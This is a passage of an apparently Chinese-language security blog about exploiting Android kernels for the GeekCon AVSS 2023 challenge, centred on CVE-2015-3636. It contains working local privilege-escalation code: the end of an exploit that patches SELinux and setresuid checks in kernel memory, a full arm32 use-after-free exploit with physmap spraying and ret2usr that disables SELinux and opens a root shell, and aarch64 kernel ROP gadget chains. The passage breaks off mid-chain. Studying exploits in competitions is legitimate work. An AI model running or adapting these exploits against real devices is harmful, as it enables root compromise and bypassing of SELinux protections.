PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n    if( buf == (void*)-1) err(\"mmap() thread\");\t\n    memset(buf, 0x0, 0x1000);\n\n    char* read_buf = buf + (0x1000-0x9b0);\n    k_stackof_read(read_buf, 0x9b0);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte;           // remap_addr_pte; \n    hexdump(read_buf, 0x9b0);\n\n    /*0x4299f743*/\n    int write_size = 0x9b0+0x13;\n    k_stackof_write(read_buf,write_size);\n\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+1; \n    write_size = 0x9b0+0xc7;\n    k_stackof_write(read_buf,write_size);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+2; \n    write_size = 0x9b0+0x69;\n    k_stackof_write(read_buf,write_size);\n\n    *((unsigned long*)&read_buf[0x970]) = remap_addr_pte+3; \n    write_size = 0x9b0+0x12;\n    k_stackof_write(read_buf,write_size);\n\n    // \n    *(unsigned long*)remap_addr_dblock_addr = d_block;                // make 0xfffffffc20000000 <--> phys_0\n\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr = 0xFFFFFFC00ACAD8E0;              // android11上是selinux_state+1的位置，而android12上又无需加1\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x200000 + (selinux_enforcing_addr - IMAGE_BASE);\n    printf(\"selinux_enforcing_addr_new: 0x%lx\\n\", selinux_enforcing_addr_new);\n    *(char*)selinux_enforcing_addr_new = 0x0;\n    // printf(\"selinux_enforcing_addr_new content: 0x%lx\\n\", *(char*)selinux_enforcing_addr_new);\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC00815F258;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x200000 + (setresuid_if_addr - IMAGE_BASE);\n    printf(\"setresuid_if_addr_new: 0x%lx\\n\",setresuid_if_addr_new);\n    *(char *)(setresuid_if_addr_new+3) = 0xB5;\n    // printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);             // 为什么加这个打印会报bus error的错？？\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC00815F62C;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x200000 + (setresgid_if_addr - IMAGE_BASE);\n    printf(\"setresgid_if_addr_new: 0x%lx\\n\",setresgid_if_addr_new);\n    *(char *)(setresgid_if_addr_new+3) = 0xB5;\n    // printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n    printf(\"setresuid\\n\");\n    setresuid(0,0,0);\n    printf(\"setresgid\\n\");\n    setresgid(0,0,0);\n    printf(\"/system/bin/sh\\n\");\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n\n    return 0;\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["kernel pwn","android"],"categories":["GeekCon 2023"]},{"title":"GeekCon AVSS 2023 初赛示例题 CVE-2015-3636","url":"/2023/09/03/230903-geekcon-prepare/","content":"\n\n\nGeekcon 2023 AVSS挑战赛的[说明文档](https://geekcon.darknavy.com/2023/china/doc/AVSS-sample-explanation-v1.0-cn.pdf)中，用 CVE-2015-3636 这个漏洞作为示例，展示了同一个漏洞在不同环境中（android 5/7/11）进行利用所面临的挑战。文档中有题目环境的下载方式。\n\n\n\n# android 5.1环境下3636的利用\n\n## 基本信息\n\n架构：arm32\n\nlinux版本：3.4.67\n\n防护措施：开启selinux，未开启PXN，PAN，KASLR\n\n## 漏洞分析\n\n在[之前的文章](https://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/#漏洞分析)中有过详细分析，这里不再重复。\n\n## 漏洞利用\n\n### 控制流劫持 - physmap spray\n\nphysmap spray分两步：\n\n- 喷UAF sock\n- 喷mmap\n\n最终，两者都会出现在physmap区域，并且有一定的概率某些sock会跟mmap内存重合。\n\n1. 第一次尝试（失败）\n   - 喷4096个 UAF sock\n   - mmap最大的空间并填充，最后搜索哪个sock被覆盖到\n2. 第二次尝试（成功）\n   - 先喷4096个 UAF sock\n   - 每mmap一次就搜索一次，直到mmap到最大空间。munmap所有空间，然后再重复mmap过程。直到找到合适的vuln sock。\n3. 第三次尝试（成功）\n   - 分散vuln sock，子进程喷1000个sock，父进程喷一个sock，几个来回后，先正常释放子进程的sock，然后触发漏洞使父进程产生vuln sock。\n   - mmap前先确定空间够用，每mmap一次就搜索一次，直到mmap到最大空间。munmap所有空间，然后再重复mmap过程。直到找到合适的vuln sock。\n\n所以，后两种方法都可以达成目的，都是结合原作者的exp改出来的，不知道为什么第一种方法在32位下就是不成功。\n\n以第3种方法为例，重点记录一下父子进程搭配创建sock部分的代码逻辑\n\n```\n- 父进程读到1，表示子进程已创建好`PADDING_SOCK_NUM`个sock fd\n- 子进程读到2，表示父进程已申请完sock fd，子进程可以继续创建下一轮sock fd\n- 父进程读到3，表示子进程已创建完4000个sock fd，父进程需要新起一个子进程继续创建padding sock fd\n```\n\n找到合适的vuln sock之后，只需 `close(vuln_sock)` 即可触发 `inet_relase()` 中对 `struct sock` 中 `sk->sk_prot->close` 函数指针的调用。所以提前将该sock的内容填充好，即可达成控制流劫持。\n\n需要注意在控制流劫持前， [ip_mc_drop_socket()](https://elixir.bootlin.com/linux/v5.4.50/C/ident/ip_mc_drop_socket) 函数中会访问 `inet->mc_list` ，需要提前将该内容置0，防止崩溃。以后在利用时也需要细心注意。\n\n### get root shell - ret2usr\n\n由于本题未开启PAN PXN KASLR等防护措施，所以到这一步就简单了。控制了函数指针后，直接ret2usr执行完 `commit_creds(prepare_kernel_cred(0))` 即可完成提权，当然还要注意关闭selinux。通过 `sel_read_enforce()` 函数找到 `selinux_enforcing` 的地址，将其改成0即可关闭selinux。最后正常返回到用户态执行 `execl(\"/system/bin/sh\", \"sh\", NULL);` 即可获得root shell。\n\n### 完整exp\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <linux/netlink.h>\n#include <linux/in.h>\n#include <sys/resource.h>\n#include <sys/sysinfo.h>\n#include <errno.h>\n\n#define PAGE_SIZE 4096\n#define MAX_VUL_SOCKS_NUM 200\n#define NSEC_PER_SEC 1000000000\n\n#define ONE_CHILD_SOCK_NUM 4000\n#define PADDING_SOCK_NUM 1000\n#define MAX_CHILD_NUM 10\n\n#define ONE_MMAP_SIZE 2*1024*1024\n#define MAX_MMAP_NUM 1024\n\n#define SIOCGSTAMPNS 0x8907\n#ifndef SIOCGSTAMPNS\n#define SIOCGSTAMPNS 0x8907\n#endif /* SIOCGSTAMPNS */\n\n#define TIMESTAMP_MAGIC 0x0db4da5f\n#define SK_STAMP_OFFSET 0x118\n\n#define MEM_RESERVE_SIZE 64*1024*1024\n\nint vuln_sock[MAX_VUL_SOCKS_NUM];\nint vuln_sock_count;\nunsigned vuln_sock_addr;\nunsigned vuln_sock_index;\n\nstruct sockaddr_in sa1,sa2;\n\nint maximize_fd_limit()\n{\n\tstruct rlimit rlim;\n\tgetrlimit(RLIMIT_NOFILE, &rlim);\n\n\trlim.rlim_cur = rlim.rlim_max;\n\tsetrlimit(RLIMIT_NOFILE, &rlim);\n\n\tgetrlimit(RLIMIT_NOFILE, &rlim);\n\treturn rlim.rlim_cur;\n}\n\nint mmap_200200(){\n    void* address = mmap((void*)0x200000, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED| MAP_FIXED |MAP_ANONYMOUS, -1, 0);\n    if(address == MAP_FAILED){\n        printf(\"map failed!\\\\n\");\n        exit(1);\n    }\n    memset(address,0x90,0x1000);\n    int ret = mlock(address, 0x1000); \n    if(ret !=0 ){\n        printf(\"mlock error in mmap_200200\\\\n\");\n        exit(1);\n    } \n    printf(\"[+] mmap 0x200000~0x201000, avoid crash.\\\\n\");     \n    return 0;\n}\n\nvoid do_child_task(int read_fd, int write_fd, int num){\n    int i,j,ret;\n    int result = 0;\n    int child_sock[ONE_CHILD_SOCK_NUM];\n\n// close other fds\n    for(i=3; i<4096; i++){\n        if(i == read_fd || i == write_fd) continue;\n        ret = close(i);\n        if(ret != 0){\n            // printf(\"[child %d] error close fd %d\\\\n\",num,i);\n            break;\n        }\n    }\n\n// every 1000 socks notice parent once\n    struct sockaddr_in sa;\n    memset(&sa, 0, sizeof(sa));\n    sa.sin_family = AF_INET;\n\n    for(i=0; i<ONE_CHILD_SOCK_NUM; i+=PADDING_SOCK_NUM){\n        for(j=0; j<PADDING_SOCK_NUM; j++){\n            child_sock[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);\n            ret = connect(child_sock[i], (const struct sockaddr *) &sa, sizeof(sa));\n            if(ret != 0){\n                printf(\"child %d connect failed! index: %d\\\\n\", num, i);\n                break;\n            }\n        }\n\n        // sync to parent\n        result = 1;\n        write(write_fd, &result, sizeof(result));\n\n        read(read_fd, &result, sizeof(result));\n        if(result == 2){\n            continue;\n        }else{\n            printf(\"[child %d] stop creating sock\\\\n\",num);\n            exit(0);\n        }\n        \n    }\n\n    result = 3;\n    write(write_fd, &result, sizeof(result));\n\n    while(1){\n        sleep(30);\n    }\n}\n\nvoid create_vuln_socks(){\n    int pipe_fd1[2];\n    int pipe_fd2[2];\n    int read_fd, write_fd;\n    int child_pid[MAX_CHILD_NUM];\n    int i,j,k,ret;\n\n    printf(\" [-] malloc socks start\\\\n\");\n// (1000 padding sock + 1 vuln sock)*n\n    signal(SIGCHLD, SIG_IGN);       // avoid child process becomes zombie\n    for(i=0; i<MAX_CHILD_NUM; i++){\n        pipe(pipe_fd1);                 // p:read c:write\n        pipe(pipe_fd2);                 // p:write c:read\n\n        child_pid[i] = fork();\n        if(child_pid[i] == 0){\n            close(pipe_fd1[0]);\n            close(pipe_fd2[1]);\n            do_child_task(pipe_fd2[0],pipe_fd1[1],i);\n            exit(0);\n        }\n\n        close(pipe_fd1[1]);\n        close(pipe_fd2[0]);\n        read_fd = pipe_fd1[0];\n        write_fd = pipe_fd2[1];\n\n        // communicate with child process, (1000 child sock + 1 parent sock)\n        int child_result;\n        for(j=0; j<10; j++){\n            read(read_fd, &child_result, sizeof(child_result));       // get child status\n            if(child_result == 1){\n                vuln_sock[vuln_sock_count] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);\n                ret = connect(vuln_sock[vuln_sock_count], (const struct sockaddr *) &sa1, sizeof(sa1));\n                if(ret != 0){\n                    printf(\"parent connect failed!\\\\n\");\n                    printf(\"index: %d\\\\n\",i);\n                } \n                vuln_sock_count++;\n                child_result = 2;\n                write(write_fd,&child_result,sizeof(child_result));   // send parent status to child\n                continue;\n            }\n            if(child_result == 3){  \n                break;\n            }\n        }\n        printf(\"    [round %d] created %d vunl sock now\\\\n\", i, vuln_sock_count);\n    }\n\n    printf(\" [-] malloc socks done\\\\n\");\n// kill all the child process\n    for(i=0;i<MAX_CHILD_NUM;i++){\n        kill(child_pid[i],SIGKILL);\n    }\n\n// trigger uaf\n    sleep(3);       // will affect trigger uaf\n\n    printf(\" [-] trigger uaf\\\\n\");\n    for(i=0; i<vuln_sock_count; i++){\n        ret = connect(vuln_sock[i], (const struct sockaddr *) &sa2, sizeof(sa2));\n        if(ret != 0){\n            printf(\"connect failed!\\\\n\");\n            printf(\"index: %d\\\\n\",i);\n        }\n        ret = connect(vuln_sock[i], (const struct sockaddr *) &sa2, sizeof(sa2));\n        if(ret != 0){\n            printf(\"connect failed!\\\\n\");\n            printf(\"index: %d\\\\n\",i);\n        }    \n    }\n\n}\n\nint get_sk_stamp(int sock){\n    struct timespec tv;\n    long long value;\n    unsigned high, low;\n    int ret;\n\n    ret = ioctl(sock, SIOCGSTAMPNS, &tv);\n    if (ret != 0) {\n        return -1;\n    }\n\n    value = ((long long)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;\n    high = (unsigned)(value >> 32);\n    low = (unsigned)value;\n\n    if (high == TIMESTAMP_MAGIC) {\n        vuln_sock_addr = low - SK_STAMP_OFFSET;\n        return 1;\n    }\n\n    return 0;\n}\n\nint find_target_sock(int *socks){\n    static void* mapped[MAX_MMAP_NUM];\n    unsigned* mapped_page;\n    int i,j, k, ret;\n    \n    int test_count = 0;\n    int mmap_count = 0;\n    struct sysinfo info;\n\n    static int reserve_size = MEM_RESERVE_SIZE;\n    static int loop_count = 0;\n\n    loop_count++;\n\n    for(i = 0; i < MAX_MMAP_NUM; i++){\n        ret = sysinfo(&info);\n        if (ret == 0) {\n            if (info.freeram < reserve_size) {\n                if (loop_count < 4) {\n                    reserve_size = info.freeram;\n                }\n                break;\n            }\n        }\n        // if(ret == 0){\n        //     if(info.freeram < MEM_RESERVE_SIZE){\n        //         break;\n        //     }\n        // }\n\n        mapped[i] = mmap(NULL, ONE_MMAP_SIZE , PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n        if(mapped[i] == MAP_FAILED){\n        \tprintf(\"mmap failed\\\\n\");\n            sleep(1);\n        \treturn 0;\n        }\n        mmap_count++;\n\n        mapped_page = mapped[i];\n        ret = mlock(mapped[i], ONE_MMAP_SIZE);\n        if(ret != 0){\n            // printf(\"mlock error\\\\n\");\n        }\n\n        for(j = 0; j < ONE_MMAP_SIZE; j += sizeof(*mapped_page)*2){\n            *mapped_page++ = (unsigned)mapped_page;\n            *mapped_page++ = TIMESTAMP_MAGIC;\n        }\n        for(k = 0; k < vuln_sock_count; k++){\n            ret = get_sk_stamp(socks[k]);\n            if (ret == 1){\n                printf(\" [-] success! find one vuln sock, index is %d\\\\n\", k);\n                vuln_sock_index = k;\n                mapped[i] = 0;      // avoid unmap\n                test_count++;\n                // break;\n            }\n        }\n        if(test_count > 0) break;\n    } \n\n    printf(\" [-] going to unmap!\\\\n\");\n    for(i=0; i<mmap_count; i++){\n        if(mapped[i]){\n            munmap(mapped[i], ONE_MMAP_SIZE);\n        }\n    }\n    printf(\" [-] unmap finished.\\\\n\");\n\n    return test_count;\n}\n\nvoid get_shell(){\n    int ret;\n\n    ret = getuid();\n    printf(\" [-] now, the uid is :%d\\\\n\",ret);\n    if(ret == 0){\n        printf(\" [-] here is a root shell, enjoy it!\\\\n\");\n        execl(\"/system/bin/sh\", \"sh\", NULL);\n    }else{\n        printf(\"failed to get root shell\\\\n\");\n        sleep(30);\n    }\n}\n\nvoid get_root(){\n    unsigned*(*pkc)(int) = 0xC0039C30;\n    int(*cc)(unsigned*) = 0xC00396FC;\n    unsigned* selinux_enforcing_addr = 0xc04ec378;\n    \n    *selinux_enforcing_addr = 0;        // setenforce 0\n    (*cc)((*pkc)(0));                   // setuid 0, etc\n\n    // unsigned ret_fast_syscall_func = 0xC000D7C0;\n    // asm\n    // (\n    //     \"LDR     R3, =0xC0039C30 \\\\n\\\\t\"   \n    //     \"MOV     R0, #0 \\\\n\\\\t\"\n    //     \"BLX     R3 \\\\n\\\\t\"\n    //     \"LDR     R3, =0xC00396FC \\\\n\\\\t\"  \n    //     \"BLX     R3 \\\\n\\\\t\"\n    //     \"LDR     R3, =0xC000D7C0 \\\\n\\\\t\" \n    //     \"BLX     R3 \\\\n\\\\t\"\n    // );\n\n}\n\nvoid do_get_root(){\n    int i,j,k,ret;\n    printf(\" [-] vuln_sock_addr: 0x%x \\\\n [-] vuln_sock_index: %d \\\\n\",vuln_sock_addr,vuln_sock_index);\n    unsigned func_addr = get_root;\n\n    printf(\" [-] get_root: 0x%lx\\\\n\",get_root);\n    printf(\" [-] func_addr: 0x%lx\\\\n\",func_addr);\n    printf(\" [-] &func_addr: 0x%lx\\\\n\",&func_addr);\n    printf(\" [-] get_shell: 0x%lx\\\\n\",get_shell); \n\n    *(unsigned*)(vuln_sock_addr+0x1c) = &func_addr;\n    *(unsigned*)(vuln_sock_addr+0x194) = 0;\n\n    printf(\" [-] set sock done!\\\\n\");\n    // sleep(10);\n    close(vuln_sock[vuln_sock_index]);\n\n    printf(\" [-] returned from kernel, let's get a shell.\\\\n\");\n    get_shell();\n}\n\nint main(){\n    int i,j,ret;\n\n    vuln_sock_count = 0;\n    memset(vuln_sock, 0x0, MAX_VUL_SOCKS_NUM);\n    \n    memset(&sa1, 0, sizeof(sa1));\n    sa1.sin_family = AF_INET;\n    memset(&sa2, 0, sizeof(sa2));\n    sa2.sin_family = AF_UNSPEC;\n\n    ret = maximize_fd_limit();\n    printf(\"[+] set rlimit. rlim.rlim_cur: %d\\\\n\",ret);\n\n    mmap_200200();\n\n// 1. create vuln socks\n    printf(\"[+] step 1: create vulnerable socks\\\\n\");\n    create_vuln_socks();\n    printf(\"[+] step 1 finished\\\\n\");\n// 2. mmap spray\n    printf(\"[+] step 2: mmap spray to find target vuln sock\\\\n\");\n    int _=0;\n    while (1) {\n        printf(\" [-] try find_target_sock: %d\\\\n\", _++);\n        ret = find_target_sock(vuln_sock);\n        if (ret != 0) {\n            printf(\" [-] Done!\\\\n\");\n            break;\n        }\n    }\n    printf(\"[+] step 2 finished\\\\n\");\n   \n// 3. hijack control flow, and get root\n    printf(\"[+] step 3: hijack kernel control flow and get root shell\\\\n\");\n    do_get_root();\n\n    printf(\"[+]should never be there\\\\n\");\n    sleep(100);\n    return 0;\n}\n```\n\n## 一些注意点\n\n本题利用心得：在未开启PAN和PXN的系统上，如果控制流劫持成功了，且劫持点是一个函数指针。那么，最简单的办法就是执行一个用户态函数（提权，改selinux等），该函数执行完毕后，内核会正常返回用户态。再在用户态中执行一下get shell函数即可。\n\n其他：\n\n- 需要使用父子进程通信时，一定要注意，尽量什么值都别传，不然一个不小心就容易出错。父子进程最常用的通信方式有pipe系统调用，或者通过ptrace来控制子进程的执行和停止。\n\n- mmap spray时，最好结合sysinfo的信息，决定何时停止mmap，防止因内存不足崩溃\n\n- mmap映射某些重要内存（后续会访问）时，最好用mlock锁定一下，防止被换出。参考：[用mlock防止内存被换出到swap空间](https://www.jianshu.com/p/4a4e653db1b2)\n\n\n\n# android 7.1 环境下3636的利用\n\n## 基本信息\n\n架构：aarch64\n\nlinux版本：3.10.0+\n\n防护措施：开启PXN，selinux；未开启PAN，KASLR\n\n```bash\ngeneric_arm64:/ # cat /proc/version\nLinux version 3.10.0+ (root@762e8f0b371a) (gcc version 4.9.x 20150123 (prerelease) (GCC) ) #5 SMP PREEMPT Fri Apr 14 12:03:15 CST 2023\n```\n\n## 漏洞分析\n\n参考[之前的文章](https://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/#漏洞分析)\n\n## 漏洞利用\n\n有几个点需要注意一下的\n\n### 控制流劫持 - physmap spray\n\naarch64上的physmap spray比 arm32的要简单些，直接用第一种方法就可以\n\n1. 第一次尝试（成功）\n\n   - 喷4096个 UAF sock\n\n   - mmap最大的空间并填充，最后搜索哪个sock被覆盖到\n\n     这里，mmap spray的内存要多点，一开始我只给了 `300*2*1024*1024` ，后来给到`5*128*1024*1024` 就可以了。（768M/1G）\n\n     另外，一次mmap的size尽量给大点，可以减少系统调用时间的消耗\n\n     关于MAX_MMAP_NUM和ONE_MMAP_SIZE，`6*(128*1024*1024)`和`384*(2*1024*1024)`都可以。\n\n### get root shell - pipe r/w\n\n> 这是作者的方法，更简洁通用\n\n1、改addr_limit\n\n利用 `kernel_setsockopt()` 函数，将进程的 `addr_limit` 设置成 0xffffffffffffffff，于是用户态可以访问内核空间。（恰好控制流劫持时X1为0，不为1，才可以跳过将addr_limit设置回TASK_SIZE那一步）\n\n改完进程的 `addr_limit` 后，就可以利用 `pipe` 系统调用来构造内核任意地址读写原语了！\n\n2、泄露thread_info\n\n方法1：利用 `mutex_trylock()` 函数的如下代码片段，泄露进程的thread_info结构体地址，计算cred地址。（恰好X1是0，会将task地址写到0x18地址处，在用户态mmap一下低地址，即可读取该值）\n\n```\n.kernel:FFFFFFC000530A58                 MOV             X2, SP\n.kernel:FFFFFFC000530A5C                 AND             X2, X2, #0xFFFFFFFFFFFFC000\n.kernel:FFFFFFC000530A60                 LDR             X2, [X2,#0x10]\n.kernel:FFFFFFC000530A64                 STR             X2, [X1,#0x18]\n.kernel:FFFFFFC000530A68                 RET\n```\n\n- 找其他gadget的方式：正则表达式`sp .* #0xFFFFFFFFFFFFC000 .* str`\n\n方法2： 通过 **JOP** 的方式将内核栈 sp 地址泄露到用户空间，然后在用户态完成计算，写cred。（相当于通过 JOP 链执行了一个函数，又返回到控制流劫持的下一条指令处。相比与kernel rop的好处是，不用恢复栈地址。）\n\n3、改selinux，改cred结构体，用户态get root shell\n\n### get root shell - kernel rop\n\n> 上面两位作者的方法，都需要找两次vuln sock，我希望只找一次sock就能成，于是我试了另一种比较笨的方法 - Kernel ROP，看能不能成。没想到，竟然真的找到一条可用的ROP链！！\n\nrop的思路是，尽可能利用系统调用时，放入内核栈中的用户态寄存器。于是需要自己写一段内联汇编，实现对 `close()` 函数的调用。需要注意参数的传递，因为对arm内联汇编不熟，这里走了些弯路。\n\n虽然有将近30个寄存器的内容可控，但是由于aarch64 ROP的特殊性，这点空间根本不够用。于是在内核完成提权和关selinux后，又回到用户态设置栈平衡。\n\n- 第一段rop - in kernel\n\n  ```c\n  b *0xffffffc000083e40\t\tel0_sync\n  b *0xffffffc0000842c8 \t\tfast_exit\n  b *0xFFFFFFC00042E39C       inet_release\n  \n  hijack pc -> 0xffffffc000118458 : add sp, sp, #0x100 ; ret\n  \n  0xffffffc0004f8198 : add sp, sp, #0x110 ; ret\n  0xffffffc0003b0e10 : add sp, sp, #0x150 ; ret\n  \n  x2,x3 -> x19,x20\n  \n  prepare_kernel_cred中，从0xffffffc0000c00c0出\n  commit_creds中，从0xffffffc0000bfbbc出\n  \n  0xffffffc0002b5f70 : ldr x21, [sp, #0x10] ; add sp, sp, #0x20 ; ret\n  0xffffffc0002cb748 : ldr x22, [x1, #0x18] ; blr x2\t\t\t// 如果x22默认是0的话，可以不设置\n  0xffffffc0002682ec : mov x22, #0 ; blr x2\n  0xffffffc0000824d8 : ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret\n  \n  0xffffffc0000813f4 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret\n  \n  0xffffffc00017eb08 : ldr x0, [x19, #0x30] ; ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\n  \n  // 改selinux\n  0xffffffc00025bc94 : str w19, [x20] ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\n  \n  // 准备改系统寄存器\n  0xffffffc0000876a0 : ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret\n  \n  // 利用 ret_fast_syscall()-> fast_exit() 中的代码，正常返回用户态\n  0xFFFFFFC000084290 : \n  \n  unsigned long long* selinux_enforcing = 0xFFFFFFC0006EB94C;\n  unsigned long long* pkc_addr = 0xFFFFFFC0000C0014;\n  unsigned long long* cc_addr = 0xFFFFFFC0000BFAB4;\n  \n      \"LDR     X0, =0x3 \\\\n\\\\t\"   \n      \"LDR     X1, =0xFFFFFFC0000C0014 \\\\n\\\\t\"\t\t// 0xFFFFFFC0000C0014 prepare_kernel_cred\t\n      \"LDR     X2, =0x0 \\\\n\\\\t\"   \t\t\t// to x19\t\n      \"LDR     X3, =selinux_enforcing \\\\n\\\\t\"\t\t\t\t// to x20\t\n      \"LDR     X4, =0x04040404 \\\\n\\\\t\"   \n      \"LDR     X5, =0xFFFFFFC0000BFAB4 \\\\n\\\\t\"\t\t// 0xFFFFFFC0000BFAB4  commit_creds\t\n      \"LDR     X6, =0x06060606 \\\\n\\\\t\"   \n      \"LDR     X7, =0X07070707 \\\\n\\\\t\"\n      \"LDR     X8, =0x39 \\\\n\\\\t\"   \n      \"LDR     X9, =0xffffffc00025bc94 \\\\n\\\\t\"\t\t// 下一条指令\t\n      \"LDR     X10, =0x10101010 \\\\n\\\\t\"   \n      \"LDR     X11, =0x11111111 \\\\n\\\\t\"\t\t\t\t\t\n      \"LDR     X12, =0x12121212 \\\\n\\\\t\"   \t\t\t\t\n      \"LDR     X13, =0X13131313 \\\\n\\\\t\"\t\t\t\t\t\n      \"LDR     X14, =0x14141414 \\\\n\\\\t\"   \n      \"LDR     X15, =0x15151515 \\\\n\\\\t\"\t\t\t\t\t\n      \"LDR     X16, =0x16161616 \\\\n\\\\t\"   \t// \n      \"LDR     X17, =0xffffffc0000876a0 \\\\n\\\\t\"\t\t// 下一条指令\n      \"LDR     X18, =0x18181818 \\\\n\\\\t\"   \t// to x19\n      \"LDR     X19, =0X19191919 \\\\n\\\\t\"\t\t// to x20\t\t\t\n      \"LDR     X20, =0x20202020 \\\\n\\\\t\"   \t\t// \n      \"LDR     X21, =0xFFFFFFC000084290  \\\\n\\\\t\"\t\t\t// 下一条指令,直接返回用户态无法执行execve，因为内核栈不平衡了。（但是可以执行除它之外的其他系统调用）\n      \"LDR     X22, =0x22222222 \\\\n\\\\t\"   \n      \"LDR     X23, =0X23232323 \\\\n\\\\t\"\n      \"LDR     X24, =0x24242424 \\\\n\\\\t\"   \t\t// to x21(pc) 0x557e31a974\n      \"LDR     X25, =0X25252525 \\\\n\\\\t\"\t\t\t// to x22 0\n      \"LDR     X26, =0x26262626 \\\\n\\\\t\"   \t\t// to x23(sp) 0x557e31df00\n      \"LDR     X27, =0X27272727 \\\\n\\\\t\"\t\t\t// to x24\n      \"LDR     X28, =0x28282828 \\\\n\\\\t\"\n  ```\n\n- 第二段rop - in user\n\n  为什么要先在内核空间做一次栈迁移，然后才迁移到用户空间呢？\n\n  因为一开始需要先使用内核函数 `commit_creds(prapare_kernel_cred(0))` 为进程提权。如果在这之前往用户空间栈迁移，会导致执行这两个内核函数时，task等结构的地址计算不正确，从而系统崩溃。\n\n  ```c\n  减栈操作 -> 没什么gadget\n  \n  栈劫持到用户态空间\n  \n  1 hijack sp:\n  hijack pc -> 0xffffffc000118458 : add sp, sp, #0x100 ; ret\n  \n  2 hijack sp： \n  0xffffffc000204894 : mov sp, x29 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\n  \n  最终目的:把x28的值（+0x3f20）给到sp\n  提前设置好x29\n  \n  从栈上初始化x0, x1\n  0xffffffc0000d9384 : ldp x0, x1, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\n  \n  因为没有直接把x28给sp的指令，所以找一个中间寄存器\n  0xffffffc0000f1194 : mov x0, x28 ; blr x1\n  \n  0xffffffc0002999ec : add x0, x0, x19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\n  \n  放到x0寄存器后,转移到x9.【令x29+0x68 == x19+0x30】\n  \n  0xffffffc0004ceab0 : stp x0, x1, [x19, #0x30] ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\n  \n  0xffffffc0004f7138 : ldr x8, [x19] ; strb w9, [sp] ; ldr x9, [x29, #0x68] ; str x9, [sp, #8] ; ldr x8, [x8, #0x1b0] ; blr x8\n  \n  x8跳到哪儿呢？\n  \n  0xffffffc00009e8b8 : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret\n  \n  0xffffffc0000d9384 : ldp x0, x1, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\n  0xffffffc000132cb8 : mov x8, x0 ; mov x0, x8 ; ldp x29, x30, [sp], #0x10 ; ret\n  \n  在这条之前设置好x30，指向0xffffffc000084290，然后执行这条指令\n  0xffffffc000084240 : ldr x30, [x8] ; mov sp, x9 ; ret\n  \n  // 在用户态mmap空间中布置好相关内容\n  int idx_1 = 0;\n  \n  (unsigned long long *)map_addr_1[0x0] = map_addr_2;\t\t// x29\n  (unsigned long long *)map_addr_1[0x8] = 0xffffffc0000d9384;\t\t// x30\n  (unsigned long long *)map_addr_1[0x10] = 0x3f20;\t\t// x19  x0+x19\n  (unsigned long long *)map_addr_1[0x18] = 0x0;\t\t// x20\n  (unsigned long long *)map_addr_1[0x20] = 0x0;\t\t// x29\n  (unsigned long long *)map_addr_1[0x28] = 0xffffffc0000f1194;\t\t// x30\n  (unsigned long long *)map_addr_1[0x30] = 0x0;\n  (unsigned long long *)map_addr_1[0x38] = 0x0;\n  (unsigned long long *)map_addr_1[0x40] = 0x0; \t\t// x29\n  (unsigned long long *)map_addr_1[0x48] = 0xffffffc0004ceab0;\t\t// x30\n  (unsigned long long *)map_addr_1[0x50] = map_addr_2+0x38;\t\t// x19\n  (unsigned long long *)map_addr_1[0x58] = 0x0;\t\t// x20\n  (unsigned long long *)map_addr_1[0x60] = map_addr_2;\t\t\t// x29\n  (unsigned long long *)map_addr_1[0x68] = 0xffffffc0004f7138;\t\t\t//x30\n  (unsigned long long *)map_addr_1[0x70] = map_addr_2;\t\t// x19\n  (unsigned long long *)map_addr_1[0x78] = 0x0;\t\t// x20\n  (unsigned long long *)map_addr_1[0x80] = 0x0;\t\t// dirt\n  (unsigned long long *)map_addr_1[0x88] = 0x0;\t\t// x9 will be stored here\n  (unsigned long long *)map_addr_1[0x90] = map_addr_3;\t\t// x29\n  (unsigned long long *)map_addr_1[0x98] = 0xffffffc0000d9384;\t\t// x30\n  (unsigned long long *)map_addr_1[0xa0] = 0x0;\t\t\t// x29\n  (unsigned long long *)map_addr_1[0xa8] = 0xffffffc000132cb8;\t\t\t\t// x30\n  (unsigned long long *)map_addr_1[0xb0] = 0x0;\n  (unsigned long long *)map_addr_1[0xb8] = 0x0;\n  (unsigned long long *)map_addr_1[0xc0] = 0x0;\t\t// x29\n  (unsigned long long *)map_addr_1[0xc8] = 